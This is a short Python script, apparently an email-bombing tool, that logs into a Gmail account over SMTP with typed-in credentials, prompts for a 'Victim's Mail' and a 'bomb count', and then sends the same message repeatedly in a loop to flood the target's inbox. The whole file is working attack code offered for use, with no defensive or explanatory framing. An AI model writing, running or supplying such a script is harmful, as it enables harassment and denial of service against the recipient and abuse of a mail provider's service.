banner = open("banner", "r")
print(banner.read())

import smtplib

sender_email = input(str("Enter The Your Gmail: "))
password = input(str("Enter The password: "))
rec_email = input(str("Enter The Victim's Mail: "))
message = input(str("Enter Your Message: "))

server = smtplib.SMTP('smtp.gmail.com', 587)
server.starttls()
server.login(sender_email, password)

print("Logged In")

counter = input("Enter bomb count: ")
count = int(counter) + 1
x = 1

while x<count:
    print(x) 
    server.sendmail(sender_email, rec_email, message)
    print(f"Mail sent to {rec_email}")
    x += 1

print("Logging Out")
server.quit()
print('Logged Out')
